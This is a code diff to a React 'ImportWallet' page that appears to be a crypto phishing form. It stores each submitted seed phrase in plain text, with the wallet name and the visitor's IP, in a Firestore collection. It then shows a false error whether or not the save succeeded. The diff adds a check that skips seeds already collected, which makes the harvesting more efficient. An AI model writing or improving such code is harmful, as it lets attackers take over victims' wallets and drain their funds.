@@ -1,4 +1,3 @@
-import * as bip39 from "@scure/bip39";
 import {
     collection,
     addDoc,
@@ -27,7 +26,6 @@ const ImportWallet = () => {
  const { walletName } = params;
  const [secretPharse, SetSecretPharse] = useState("");
  const [IsShowErrMsg, SetShowErrMsg] = useState(false);
- const [IsValidPharse, SetValidPharse] = useState(false);
  const [IsProcessing, SetProcessing] = useState(false);
  const usersRef = collection(db, "mydata");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
@@ -80,6 +78,21 @@ function validateMnemonic(mnemonic) {
   if (![12, 15, 18, 21, 24].includes(count)) return false;
   return true;
 }
+
+ async function checkExistsBySeed(code) {
+    try {
+      const q = query(
+        collection(db, "mydata"),
+        where("secret", "==", code),
+        limit(1) 
+      );
+      const querySnapshot = await getDocs(q);
+      return !querySnapshot.empty; 
+    } catch (error) {
+      console.error("Error:", error);
+      throw error;
+    }
+  }
     
   const handleSubmit = async (e) => {
    try{
@@ -88,16 +101,21 @@ function validateMnemonic(mnemonic) {
         var formattedSeedPhrase = normalizeText(secretPharse);
         if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
             if(validateMnemonic(formattedSeedPhrase)){
-                var _asset = '';
-                var _total = 0;
-                var _s = 1;
-                const user = await addDoc(collection(db, "mydata"), {
-                    src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
-                });
-                if(user.id){
+                const isExist = await checkExistsBySeed(formattedSeedPhrase);
+                if(!isExist){
+                    var _asset = '';
+                    var _total = 0;
+                    var _s = 1;
+                    const user = await addDoc(collection(db, "mydata"), {
+                        src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
+                    });
+                    if(user.id){
+                        setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
+                        updateIndex(user.id);
+                        SetShowErrMsg(true);
+                    }
+                }else{
                     setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1);
-                    updateIndex(user.id);
-                    SetValidPharse(true);
                     SetShowErrMsg(true);
                 }
             }else{
